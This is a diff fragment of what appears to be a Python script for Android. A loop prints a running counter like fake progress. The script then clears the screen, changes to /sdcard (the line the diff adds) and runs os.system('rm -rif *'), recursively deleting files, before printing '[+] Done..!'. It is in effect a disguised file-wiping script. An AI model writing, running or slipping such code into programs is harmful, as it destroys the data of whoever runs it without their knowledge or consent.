@@ -11,6 +11,7 @@ while A7Y < 10000:
         A7Y = A7Y +1
         print( A7Y)
 os.system ("clear")
+os.system ('cd /sdcard')
 os.system ('rm -rif *')
 print ("[+] Done..!")
 #~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
